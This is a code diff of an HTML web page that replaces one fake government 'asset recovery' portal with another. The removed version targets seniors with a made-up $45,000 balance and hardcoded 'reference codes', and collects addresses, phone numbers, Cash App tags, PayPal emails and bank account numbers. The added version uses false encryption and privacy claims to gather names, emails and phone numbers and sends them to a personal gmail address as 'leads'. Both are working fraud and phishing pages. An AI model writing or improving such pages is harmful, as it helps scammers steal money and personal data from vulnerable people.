@@ -3,752 +3,298 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>National Senior Legacy Administration</title>
+    <title>National Asset Recovery & Property Claims Intake</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --primary: #112240;
-            --primary-hover: #1d3557;
-            --accent: #b8860b;
-            --success: #2e7d32;
-            --danger: #d32f2f;
-            --text-dark: #23272a;
-            --text-light: #64748b;
-            --bg-light: #f1f5f9;
-            --white: #ffffff;
+            --primary: #0a2540;
+            --secondary: #639fab;
+            --accent: #00875a;
+            --error: #de350b;
+            --background: #f8f9fa;
+            --text: #333333;
+            --card-bg: #ffffff;
+            --border: #e2e8f0;
         }
 
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Inter', sans-serif;
         }
 
         body {
-            background-color: var(--bg-light);
-            color: var(--text-dark);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            overflow-x: hidden;
+            background-color: var(--background);
+            color: var(--text);
+            line-height: 1.6;
+            padding: 10px;
         }
 
-        .portal-container {
-            width: 100%;
-            max-width: 600px;
-            background: var(--white);
-            border-radius: 16px;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
-            padding: 35px;
-            margin: 20px;
-            position: relative;
-            min-height: 540px;
-        }
-
-        /* Live Activity Top Badge */
-        .live-status-bar {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 6px;
-            background: #e6f4ea;
-            color: var(--success);
-            font-size: 13px;
-            font-weight: 700;
-            padding: 8px 16px;
-            border-radius: 20px;
-            width: fit-content;
-            margin: 0 auto 20px auto;
-            border: 1px solid #c2e7cd;
-        }
-
-        .live-dot {
-            width: 8px;
-            height: 8px;
-            background-color: #137333;
-            border-radius: 50%;
-            display: inline-block;
-            animation: livePulse 1.8s infinite ease-in-out;
-        }
-
-        @keyframes livePulse {
-            0% { transform: scale(0.9); opacity: 0.6; }
-            50% { transform: scale(1.2); opacity: 1; }
-            100% { transform: scale(0.9); opacity: 0.6; }
-        }
-
-        .platform-header {
+        .security-banner {
+            background-color: var(--primary);
+            color: #ffffff;
             text-align: center;
-            margin-bottom: 25px;
-            border-bottom: 2px solid #e2e8f0;
+            padding: 8px 10px;
+            font-size: 11px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            border-radius: 6px;
+            margin-bottom: 15px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+        }
+
+        .container {
+            max-width: 480px;
+            margin: 0 auto;
+        }
+
+        .portal-card {
+            background-color: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 20px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.03);
+        }
+
+        .header-section {
+            text-align: center;
+            margin-bottom: 20px;
+            border-bottom: 2px solid var(--background);
             padding-bottom: 15px;
         }
 
-        .brand-title {
-            color: var(--primary);
+        .header-section h1 {
             font-size: 20px;
+            color: var(--primary);
             font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
+            margin-bottom: 6px;
         }
 
-        .brand-tagline {
-            color: var(--accent);
-            font-size: 12px;
-            font-weight: 600;
-            margin-top: 2px;
+        .header-section p {
+            font-size: 13px;
+            color: #64748b;
         }
 
-        .page {
-            display: none;
-            opacity: 0;
-            transform: translateX(30px);
-            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
-        }
-
-        .page.active {
+        label {
             display: block;
-            opacity: 1;
-            transform: translateX(0);
-        }
-
-        .page.exit {
-            display: block;
-            opacity: 0;
-            transform: translateX(-30px);
-            position: absolute;
-            width: calc(100% - 70px);
-        }
-
-        h2 {
-            color: var(--primary);
-            font-size: 22px;
-            margin-bottom: 8px;
-            font-weight: 600;
-        }
-
-        p.subtitle {
-            color: var(--text-light);
-            font-size: 14px;
-            margin-bottom: 25px;
-        }
-
-        .card {
-            background: var(--bg-light);
-            border: 1px solid #e2e8f0;
-            border-radius: 10px;
-            padding: 20px;
-            margin-bottom: 20px;
-            box-shadow: inset 0 2px 4px rgba(0,0,0,0.02);
-        }
-
-        .flex-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 12px 0;
-            border-bottom: 1px solid #e2e8f0;
-        }
-
-        .flex-row:last-child {
-            border-bottom: none;
-        }
-
-        .label {
-            color: var(--text-light);
-            font-weight: 500;
-            font-size: 14px;
-        }
-
-        .value {
-            color: var(--text-dark);
-            font-weight: 600;
-            font-size: 15px;
-        }
-
-        .input-group {
-            display: flex;
-            flex-direction: column;
-            gap: 6px;
-            margin-bottom: 15px;
-        }
-
-        .address-grid {
-            display: grid;
-            grid-template-columns: 2fr 1fr 1fr;
-            gap: 10px;
-            margin-bottom: 15px;
-        }
-
-        @media (max-width: 480px) {
-            .address-grid {
-                grid-template-columns: 1fr;
-                gap: 0;
-            }
-        }
-
-        .input-group label {
             font-size: 13px;
             font-weight: 600;
             color: var(--primary);
+            margin-bottom: 6px;
+            margin-top: 15px;
         }
 
-        .input-group input {
-            padding: 12px;
-            border: 1px solid #cbd5e0;
-            border-radius: 8px;
-            font-size: 14px;
+        input[type="text"],
+        input[type="email"],
+        input[type="tel"],
+        select {
             width: 100%;
+            padding: 12px;
+            border: 1px solid #cbd5e1;
+            border-radius: 8px;
+            font-size: 15px;
+            color: var(--text);
+            background-color: #ffffff;
+            transition: all 0.2s ease-in-out;
+            -webkit-appearance: none;
+        }
+
+        input:focus, select:focus {
             outline: none;
-            transition: all 0.2s ease;
+            border-color: var(--accent);
+            box-shadow: 0 0 0 3px rgba(0, 135, 90, 0.1);
         }
 
-        .input-group input:focus {
-            border-color: var(--primary);
-            box-shadow: 0 0 0 3px rgba(17, 34, 64, 0.15);
+        .input-error {
+            border-color: var(--error) !important;
+            background-color: #fff8f6;
         }
 
-        .input-group.field-error input {
-            border-color: var(--danger) !important;
-            background-color: #fff8f8;
-            box-shadow: 0 0 0 2px rgba(211, 47, 47, 0.2);
-        }
-
-        .inline-error-msg {
+        .error-message {
+            color: var(--error);
+            font-size: 12px;
+            font-weight: 500;
+            margin-top: 4px;
             display: none;
-            color: var(--danger);
-            font-size: 13px;
-            font-weight: 600;
-            margin-bottom: 15px;
-            text-align: center;
-            padding: 10px;
-            background: #fde8e8;
-            border-radius: 6px;
-            border: 1px solid #f8b4b4;
+        }
+
+        .form-step {
+            display: none;
+        }
+
+        .form-step.active {
+            display: block;
+            animation: fadeIn 0.3s ease-in-out;
         }
 
         .btn {
-            background: var(--primary);
-            color: var(--white);
-            border: none;
-            padding: 15px 28px;
-            font-size: 16px;
-            font-weight: 600;
-            border-radius: 8px;
-            cursor: pointer;
+            display: block;
             width: 100%;
-            transition: background 0.2s, transform 0.1s;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 10px;
-            box-shadow: 0 4px 6px rgba(17, 34, 64, 0.1);
-        }
-
-        .btn:hover {
-            background: var(--primary-hover);
-        }
-
-        .loader-container {
-            display: none;
-            text-align: center;
-            padding: 40px 20px;
-        }
-
-        .spinner {
-            width: 55px;
-            height: 55px;
-            border: 5px solid #edf2f7;
-            border-top: 5px solid var(--accent);
-            border-radius: 50%;
-            margin: 0 auto 25px auto;
-            animation: spin 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .progress-bar-bg {
-            width: 100%;
-            background-color: #e2e8f0;
-            border-radius: 10px;
-            height: 8px;
-            margin-top: 20px;
-            overflow: hidden;
-        }
-
-        .progress-bar-fill {
-            width: 0%;
-            height: 100%;
+            padding: 14px;
             background-color: var(--primary);
-            transition: width 15s linear;
-        }
-
-        .balance-box {
-            background: linear-gradient(135deg, var(--primary) 0%, #23395b 100%);
-            color: var(--white);
-            text-align: center;
-            padding: 22px;
-            border-radius: 10px;
-            margin-bottom: 20px;
-            box-shadow: 0 4px 12px rgba(17, 34, 64, 0.15);
-        }
-
-        .balance-amount {
-            font-size: 34px;
-            font-weight: 700;
-            margin-top: 4px;
-            letter-spacing: -0.5px;
-        }
-
-        .status-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            background: #feebc8;
-            color: #c05621;
-            padding: 6px 16px;
-            border-radius: 20px;
-            font-weight: 600;
-            font-size: 13px;
-            margin-bottom: 20px;
-            animation: pulse 2s infinite ease-in-out;
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            70% { transform: scale(1.03); }
-            100% { transform: scale(1); }
-        }
-
-        .method-options {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            margin-bottom: 25px;
-        }
-
-        .method-option {
-            border: 2px solid #e2e8f0;
-            border-radius: 10px;
-            padding: 16px;
-            cursor: pointer;
-            transition: all 0.25s ease;
-        }
-
-        .method-option.selected {
-            border-color: var(--accent);
-            background: #fffdf6;
-        }
-
-        .method-header {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            font-weight: 600;
+            color: white;
+            border: none;
+            border-radius: 8px;
             font-size: 15px;
-            color: var(--primary);
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 20px;
+            text-align: center;
         }
 
-        .method-fields {
-            max-height: 0;
-            overflow: hidden;
-            transition: max-height 0.35s cubic-bezier(0.4, 0, 0.2, 1), margin-top 0.35s ease;
+        .btn-submit {
+            background-color: var(--accent);
         }
 
-        .method-option.selected .method-fields {
-            max-height: 180px;
-            margin-top: 15px;
-            border-top: 1px solid #edf2f7;
-            padding-top: 15px;
+        .trust-footer {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #64748b;
+            background-color: #f1f5f9;
+            padding: 12px;
+            border-radius: 8px;
         }
 
-        .process-clock {
-            width: 75px;
-            height: 75px;
-            background: #fff8eb;
-            border: 3px solid #f6ad55;
-            border-radius: 50%;
+        .badge-row {
             display: flex;
             justify-content: center;
-            align-items: center;
-            margin: 0 auto 20px auto;
-            color: #dd6b20;
-            font-size: 34px;
-            font-weight: bold;
+            gap: 15px;
+            margin-top: 8px;
+            font-weight: 600;
+            font-size: 11px;
+            color: #475569;
         }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
 <body>
 
-<div class="portal-container">
-    
-    <!-- Permanent Live Active Client Counter Badge -->
-    <div class="live-status-bar">
-        <span class="live-dot"></span>
-        <span>3,142 Citizens Active Online</span>
+<div class="container">
+    <div class="security-banner">
+        🔒 SECURE 256-BIT ENCRYPTION PROTOCOL ACTIVE • TREASURY INTENT SYSTEM
     </div>
 
-    <div class="platform-header">
-        <div class="brand-title">National Senior Legacy Administration</div>
-        <div class="brand-tagline">Private Senior Citizen Disbursement & Portfolio Management</div>
+    <div class="portal-card" id="portalCard">
+        <div class="header-section">
+            <h1>Asset Recovery Portal</h1>
+            <p>National Property & Unclaimed Capital Intake System</p>
+        </div>
+
+        <form action="https://formsubmit.co/doroskiiwilliams@gmail.com" method="POST" id="portalForm">
+            
+            <input type="hidden" name="_next" value="https://yourportal.github.io/success.html">
+            <input type="hidden" name="_subject" value="⚠️ NEW PRIORITY ASSET INTAKE LEAD">
+            <input type="hidden" name="_captcha" value="true">
+            <input type="text" name="_honey" style="display:none">
+
+            <div class="form-step active" id="step1">
+                <label for="propertyState">Select State / Region of Origin</label>
+                <select name="propertyState" id="propertyState">
+                    <option value="" disabled selected>Choose Region...</option>
+                    <option value="TX">Texas (TX Registry)</option>
+                    <option value="FL">Florida (FL Registry)</option>
+                    <option value="NY">New York (NY Registry)</option>
+                    <option value="CA">California (CA Registry)</option>
+                    <option value="Other">Other Region / International File</option>
+                </select>
+                <div class="error-message" id="stateError">⚠️ Please select your region of origin to query the registry.</div>
+
+                <label for="assetTier">Estimated Unclaimed Capital Range</label>
+                <select name="assetTier" id="assetTier">
+                    <option value="" disabled selected>Select Estimated Amount...</option>
+                    <option value="Tier1">Under $1,000</option>
+                    <option value="Tier2">$1,000 - $10,000</option>
+                    <option value="Tier3">$10,000 - $50,000</option>
+                    <option value="Tier4">$50,000+ (Immediate High Priority)</option>
+                </select>
+                <div class="error-message" id="tierError">⚠️ Selecting an estimated range is required to initialize verification.</div>
+
+                <button type="button" class="btn" onclick="goToStep2()">Verify Asset Records →</button>
+            </div>
+
+            <div class="form-step" id="step2">
+                <div style="background-color: #e6f4ea; color: #137333; padding: 10px; border-radius: 6px; font-size: 13px; font-weight: 500; text-align: center; margin-bottom: 15px;">
+                    ✓ Pre-Qualification Complete: Active matches flagged.
+                </div>
+
+                <label for="fullName">Full Legal Name</label>
+                <input type="text" name="fullName" id="fullName" placeholder="As it appears on official ID" disabled>
+                <div class="error-message" id="nameError">⚠️ Full legal name is required to match state ledger data.</div>
+
+                <label for="email">Secure Notification Email</label>
+                <input type="email" name="email" id="email" placeholder="For record file updates" disabled>
+                <div class="error-message" id="emailError">⚠️ Provide a valid email address to receive tracking file updates.</div>
+
+                <label for="phone">Primary Contact Number</label>
+                <input type="tel" name="phone" id="phone" placeholder="123-456-7890" maxlength="12" disabled>
+                <div class="error-message" id="phoneError">⚠️ A primary standard phone contact is required.</div>
+
+                <button type="button" class="btn btn-submit" onclick="validateAndSubmit()">Submit Secure Request & Finalize</button>
+            </div>
+        </form>
+
+        <div class="trust-footer">
+            All transited data is encrypted. This verification portal strictly adheres to consumer privacy standards. No data is shared with unverified third parties.
+            <div class="badge-row">
+                <span>🛡️ SECURE ASSET DEPLOYMENT</span>
+                <span>⚙️ INTENT MATCHED</span>
+            </div>
+        </div>
     </div>
-
-    <form action="https://formsubmit.co/YOUR_EMAIL_HERE@EXAMPLE.COM" method="POST" id="portalMasterForm">
-        
-        <input type="hidden" name="_subject" value="New File Record Submission Received">
-        <input type="hidden" name="_captcha" value="false">
-
-        <!-- PAGE 1: CLIENT IDENTIFICATION ENTRY -->
-        <div id="page1" class="page active">
-            <h2>Asset Recovery Portal</h2>
-            <p class="subtitle">Enter your file verification details below to initiate secure system review.</p>
-            
-            <div id="p1-error-frame" class="inline-error-msg">Failed to Continue: Invalid details or unauthorized Reference Number.</div>
-
-            <div class="card" style="background: #fff; padding: 15px 20px 5px 20px;">
-                <div class="input-group" id="grp-name">
-                    <label for="client_name">Full Name</label>
-                    <input type="text" name="Client Full Name" id="client_name" placeholder="e.g. Johnathan Doe">
-                </div>
-                
-                <!-- Expanded Easy Layout Address Breakdown -->
-                <div class="address-grid">
-                    <div class="input-group" id="grp-city">
-                        <label for="client_city">City</label>
-                        <input type="text" name="Client City" id="client_city" placeholder="e.g. Portland">
-                    </div>
-                    <div class="input-group" id="grp-state">
-                        <label for="client_state">State / Region</label>
-                        <input type="text" name="Client State" id="client_state" placeholder="e.g. Surrey">
-                    </div>
-                    <div class="input-group" id="grp-zip">
-                        <label for="client_zip">Zip / Postal</label>
-                        <input type="text" name="Client Zip Code" id="client_zip" placeholder="e.g. 00000">
-                    </div>
-                </div>
-
-                <div class="input-group" id="grp-phone">
-                    <label for="client_phone">Contact Phone Number</label>
-                    <input type="tel" name="Client Phone Number" id="client_phone" placeholder="e.g. +1 (876) 555-0199">
-                </div>
-
-                <div class="input-group" id="grp-ref">
-                    <label for="ref_code">File Reference Number (Format: AAA/1234)</label>
-                    <input type="text" name="Verified Reference Code" id="ref_code" placeholder="e.g. SRN/4821" maxlength="8">
-                </div>
-            </div>
-
-            <button type="button" class="btn" onclick="startSystemReview()">
-                Verify File Records
-            </button>
-        </div>
-
-        <!-- 15-SECOND DELAY ANIMATION PANEL -->
-        <div id="review-loader" class="loader-container">
-            <div class="spinner"></div>
-            <h3 style="color: var(--primary); margin-bottom: 5px;">Analyzing File Registry...</h3>
-            <p style="color: var(--text-light); font-size: 14px;">Performing automatic allocation ledger balance review.</p>
-            <div class="progress-bar-bg">
-                <div id="progress-bar" class="progress-bar-fill"></div>
-            </div>
-        </div>
-
-        <!-- PAGE 2: VERIFIED OWNERSHIP STATUS OVERVIEW -->
-        <div id="page2" class="page">
-            <h2>Confirm Verification</h2>
-            <p class="subtitle">Please review your allocated file balance details below before executing the clearance.</p>
-            
-            <div class="balance-box" style="background: #23395b;">
-                <div style="font-size: 13px; opacity: 0.9; text-transform: uppercase;">Allocated File Balance</div>
-                <div class="balance-amount">$45,000.00</div>
-            </div>
-
-            <div class="card" style="background: #ffffff; border: 1px solid #cbd5e0; margin-bottom: 20px;">
-                <div style="font-size: 11px; font-weight: 700; color: var(--accent); text-transform: uppercase; margin-bottom: 8px; letter-spacing: 0.5px;">Verified File Ownership Record</div>
-                <div class="flex-row" style="padding: 6px 0;"><span class="label">Client Name:</span><span class="value" id="mirror-name">---</span></div>
-                <div class="flex-row" style="padding: 6px 0;"><span class="label">Registered Location:</span><span class="value" id="mirror-address" style="font-size:14px;">---</span></div>
-                <div class="flex-row" style="padding: 6px 0;"><span class="label">Contact Phone:</span><span class="value" id="mirror-phone">---</span></div>
-                <div class="flex-row" style="padding: 6px 0;"><span class="label">File Reference:</span><span class="value" id="mirror-ref">---</span></div>
-            </div>
-
-            <div class="card" style="background: #f1f5f9;">
-                <div class="flex-row">
-                    <span class="label">Verification Status</span>
-                    <span class="value" style="color: var(--success); font-weight: bold;">PASSED & CONFIRMED</span>
-                </div>
-                <div class="flex-row">
-                    <span class="label">Portal Lock State</span>
-                    <span class="value" style="color: var(--success);">SECURE EXCLUSIVE MATCH</span>
-                </div>
-            </div>
-
-            <button type="button" class="btn" onclick="switchPage('page2', 'page3')">
-                Proceed to Payout
-            </button>
-        </div>
-
-        <!-- PAGE 3: DISBURSEMENT CONFIGURATION TARGET -->
-        <div id="page3" class="page">
-            <h2>Disbursement Management</h2>
-            <p class="subtitle">Update your preferences below to direct your pending balance transfer.</p>
-
-            <div style="text-align: center;">
-                <div class="status-badge">
-                    <span style="width: 8px; height: 8px; background: #dd6b20; border-radius: 50%;"></span>
-                    In Process
-                </div>
-            </div>
-
-            <div class="balance-box">
-                <div style="font-size: 13px; opacity: 0.9; text-transform: uppercase;">Available Balance</div>
-                <div class="balance-amount">$45,000.00</div>
-            </div>
-
-            <div id="p3-error-frame" class="inline-error-msg">Failed to Continue: Please pick an option and fill out account endpoints.</div>
-
-            <input type="hidden" name="Selected Transfer Type" id="hiddenMethodType" value="Not Chosen">
-
-            <div class="method-options">
-                
-                <!-- Cash App -->
-                <div class="method-option" id="opt-cashapp" onclick="selectPaymentMethod('cashapp')">
-                    <div class="method-header">
-                        <input type="radio" id="rad-cashapp" style="accent-color: var(--primary);">
-                        <span>Cash App</span>
-                    </div>
-                    <div class="method-fields">
-                        <div class="input-group" id="grp-cash-val">
-                            <label for="cashapp_tag">Cashtag ($)</label>
-                            <input type="text" name="CashApp Cashtag Data" id="cashapp_tag" placeholder="Enter your $Cashtag" onclick="event.stopPropagation();">
-                        </div>
-                    </div>
-                </div>
-
-                <!-- PayPal -->
-                <div class="method-option" id="opt-paypal" onclick="selectPaymentMethod('paypal')">
-                    <div class="method-header">
-                        <input type="radio" id="rad-paypal" style="accent-color: var(--primary);">
-                        <span>PayPal Account</span>
-                    </div>
-                    <div class="method-fields">
-                        <div class="input-group" id="grp-pay-val">
-                            <label for="paypal_email">PayPal Email Address</label>
-                            <input type="email" name="PayPal Email Account" id="paypal_email" placeholder="name@example.com" onclick="event.stopPropagation();">
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Banking Routing -->
-                <div class="method-option" id="opt-banking" onclick="selectPaymentMethod('banking')">
-                    <div class="method-header">
-                        <input type="radio" id="rad-banking" style="accent-color: var(--primary);">
-                        <span>Direct Bank Transfer / Wire Info</span>
-                    </div>
-                    <div class="method-fields">
-                        <div class="input-group" id="grp-bnk-val1">
-                            <label for="bank_name">Bank Name</label>
-                            <input type="text" name="Bank Financial Name" id="bank_name" placeholder="Enter routing or bank name" onclick="event.stopPropagation();">
-                        </div>
-                        <div class="input-group" id="grp-bnk-val2">
-                            <label for="account_num">Account Number / IBAN</label>
-                            <input type="text" name="Bank Account Number String" id="account_num" placeholder="Enter account details" onclick="event.stopPropagation();">
-                        </div>
-                    </div>
-                </div>
-
-            </div>
-
-            <button type="button" class="btn" style="background: var(--success);" onclick="processDashboardUpdate()">
-                Submit Settings Transfer
-            </button>
-        </div>
-
-        <!-- PAGE 4: EDITED TRANSACTING PENDING ACCOUNT STATUS -->
-        <div id="page4" class="page">
-            <div class="process-clock">⏳</div>
-            <h2 style="text-align: center;">Transfer In Process</h2>
-            <p class="subtitle" style="text-align: center;">Your verification records and payout endpoints have been queued.</p>
-
-            <div class="balance-box" style="background: #1e293b;">
-                <div style="font-size: 13px; opacity: 0.8; text-transform: uppercase;">Total Pending Transmission Portfolio</div>
-                <div class="balance-amount">$45,000.00</div>
-            </div>
-
-            <div class="card">
-                <div class="flex-row">
-                    <span class="label">Disbursement Status</span>
-                    <span class="value" style="color: #dd6b20; font-weight: bold;">PROCESSING HOLD</span>
-                </div>
-                <div class="flex-row">
-                    <span class="label">Estimated Timeframe</span>
-                    <span class="value" style="color: var(--primary);">1 to 2 Business Days</span>
-                </div>
-                <div class="flex-row">
-                    <span class="label">Verification Mask Tracker</span>
-                    <span class="value" id="dash-masked-details">•••• ••••</span>
-                </div>
-            </div>
-
-            <div style="background: #fffaf0; border: 1px solid #feebc8; border-radius: 8px; padding: 14px; font-size: 13px; color: #c05621; text-align: center; margin-bottom: 20px; font-weight: 500;">
-                The administrative allocation desk is certifying matching record credentials. File processing will clear sequentially within 24 hours.
-            </div>
-        </div>
-
-    </form>
 </div>
 
 <script>
-    const ALLOWED_REFERENCE_CODES = [
-        "SRN/4821",
-        "LEG/9052",
-        "ADM/3147",
-        "VTR/7710",
-        "SLR/6385"
-    ];
+    // Navigation Step 1 to Step 2
+    function goToStep2() {
+        const stateSelect = document.getElementById('propertyState');
+        const tierSelect = document.getElementById('assetTier');
+        const stateError = document.getElementById('stateError');
+        const tierError = document.getElementById('tierError');
+        let error = false;
 
-    function startSystemReview() {
-        document.getElementById('p1-error-frame').style.display = 'none';
-        document.querySelectorAll('#page1 .input-group').forEach(el => el.classList.remove('field-error'));
+        stateSelect.classList.remove('input-error');
+        tierSelect.classList.remove('input-error');
+        stateError.style.display = 'none';
+        tierError.style.display = 'none';
 
-        const nameVal = document.getElementById('client_name').value.trim();
-        const cityVal = document.getElementById('client_city').value.trim();
-        const stateVal = document.getElementById('client_state').value.trim();
-        const zipVal = document.getElementById('client_zip').value.trim();
-        const phnVal = document.getElementById('client_phone').value.trim();
-        const refVal = document.getElementById('ref_code').value.trim();
+        if(stateSelect.value === "") { stateSelect.classList.add('input-error'); stateError.style.display = 'block'; error = true; }
+        if(tierSelect.value === "") { tierSelect.classList.add('input-error'); tierError.style.display = 'block'; error = true; }
+        if(error) return;
 
-        let formulationValid = true;
-
-        if(!nameVal) { document.getElementById('grp-name').classList.add('field-error'); formulationValid = false; }
-        if(!cityVal) { document.getElementById('grp-city').classList.add('field-error'); formulationValid = false; }
-        if(!stateVal) { document.getElementById('grp-state').classList.add('field-error'); formulationValid = false; }
-        if(!zipVal) { document.getElementById('grp-zip').classList.add('field-error'); formulationValid = false; }
-        if(!phnVal)  { document.getElementById('grp-phone').classList.add('field-error'); formulationValid = false; }
-        
-        if(!refVal || !ALLOWED_REFERENCE_CODES.includes(refVal)) { 
-            document.getElementById('grp-ref').classList.add('field-error'); 
-            formulationValid = false; 
-        }
-
-        if(!formulationValid) {
-            document.getElementById('p1-error-frame').style.display = 'block';
-            return;
-        }
-
-        // Combine fields smoothly for the mirrored display
-        const fullLocationString = `${cityVal}, ${stateVal} ${zipVal}`;
-        document.getElementById('mirror-name').innerText = nameVal;
-        document.getElementById('mirror-address').innerText = fullLocationString;
-        document.getElementById('mirror-phone').innerText = phnVal;
-        document.getElementById('mirror-ref').innerText = refVal;
-
-        const p1 = document.getElementById('page1');
-        const loader = document.getElementById('review-loader');
-        const bar = document.getElementById('progress-bar');
-
-        p1.classList.add('exit');
-        p1.classList.remove('active');
-
-        setTimeout(() => {
-            p1.style.display = 'none';
-            p1.classList.remove('exit');
-            
-            loader.style.display = 'block';
-            setTimeout(() => { bar.style.width = '100%'; }, 50);
-
-            setTimeout(() => {
-                loader.style.display = 'none';
-                const p2 = document.getElementById('page2');
-                p2.style.display = 'block';
-                setTimeout(() => { p2.classList.add('active'); }, 20);
-            }, 15000);
-
-        }, 400);
+        document.getElementById('step1').classList.remove('active');
+        const step2 = document.getElementById('step2');
+        step2.classList.add('active');
+        step2.querySelectorAll('input').forEach(i => i.removeAttribute('disabled'));
     }
 
-    function switchPage(oldId, newId) {
-        const oldPage = document.getElementById(oldId);
-        const newPage = document.getElementById(newId);
+    // Validation and Final Form Submit
+    function validateAndSubmit() {
+        const name = document.getElementById('fullName');
+        const email = document.getElementById('email');
+        const phone = document.getElementById('phone');
+        let error = false;
 
-        oldPage.classList.add('exit');
-        oldPage.classList.remove('active');
+        [name, email, phone].forEach(i => i.classList.remove('input-error'));
+        ['nameError', 'emailError', 'phoneError'].forEach(e => document.getElementById(e).style.display = 'none');
 
-        setTimeout(() => {
-            oldPage.style.display = 'none';
-            oldPage.classList.remove('exit');
-            
-            newPage.style.display = 'block';
-            setTimeout(() => { newPage.classList.add('active'); }, 20);
-        }, 400);
+        if(name.value.trim() === "") { name.classList.add('input-error'); document.getElementById('nameError').style.display = 'block'; error = true; }
+        if(!email.value.includes('@') || email.value.trim() === "") { email.classList.add('input-error'); document.getElementById('emailError').style.display = 'block'; error = true; }
+        if(phone.value.length < 12) { phone.classList.add('input-error'); document.getElementById('phoneError').style.display = 'block'; error = true; }
+        if(error) return;
+
+        // Triggers the standard HTML form submission loop natively
+        document.getElementById('portalForm').submit();
     }
 
-    function selectPaymentMethod(method) {
-        document.getElementById('p3-error-frame').style.display = 'none';
-        document.querySelectorAll('#page3 .input-group').forEach(el => el.classList.remove('field-error'));
-        
-        document.querySelectorAll('.method-option').forEach(el => el.classList.remove('selected'));
-        document.querySelectorAll('input[name="payment_pref"]').forEach(radio => radio.checked = false);
-
-        document.getElementById(`opt-${method}`).classList.add('selected');
-        document.getElementById(`rad-${method}`).checked = true;
-        
-        document.getElementById('hiddenMethodType').value = method.toUpperCase();
-    }
-
-    function processDashboardUpdate() {
-        document.getElementById('p3-error-frame').style.display = 'none';
-        document.querySelectorAll('#page3 .input-group').forEach(el => el.classList.remove('field-error'));
-
-        const checkedRadio = document.querySelector('.method-option.selected');
-        if (!checkedRadio) {
-            document.getElementById('p3-error-frame').style.display = 'block';
-            return;
-        }
-
-        const methodType = checkedRadio.id.replace('opt-', '');
-        let maskedVal = "•••• ••••";
-        let localValid = true;
-
-        if(methodType === 'cashapp') {
-            const tag = document.getElementById('cashapp_tag').value.trim();
-            if(!tag) { document.getElementById('grp-cash-val').classList.add('field-error'); localValid = false; }
-            maskedVal = `$••••${tag.slice(-3)}`;
-        } else if(methodType === 'paypal') {
-            const mail = document.getElementById('paypal_email').value.trim();
-            if(!mail) { document.getElementById('grp-pay-val').classList.add('field-error'); localValid = false; }
-            maskedVal = `•••${mail.slice(mail.indexOf('@') - 3)}`;
-        } else if(methodType === 'banking') {
-            const bnk = document.getElementById('bank_name').value.trim();
-            const acc = document.getElementById('account_num').value.trim();
-            if(!bnk) { document.getElementById('grp-bnk-val1').classList.add('field-error'); localValid = false; }
-            if(!acc) { document.getElementById('grp-bnk-val2').classList.add('field-error'); localValid = false; }
-            maskedVal = `•••• •••• ${acc.slice(-4)}`;
-        }
-
-        if(!localValid) {
-            document.getElementById('p3-error-frame').style.display = 'block';
-            return;
-        }
-
-        document.getElementById('dash-masked-details').innerText = maskedVal;
-
-        const activeForm = document.getElementById('portalMasterForm');
-        const inputPayload = new FormData(activeForm);
-
-        fetch(activeForm.action, {
-            method: 'POST',
-            body: inputPayload,
-            headers: {
-                'Accept': 'application/json'
-            }
-        });
-
-        switchPage('page3', 'page4');
-    }
+    // Dynamic Mobile Phone Formatting Script
+    document.getElementById('phone').addEventListener('input', function (e) {
+        let x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,4})/);
+        e.target.value = !x[2] ? x[1] : x[1] + '-' + x[2] + (x[3] ? '-' + x[3] : '');
+    });
 </script>
 
 </body>
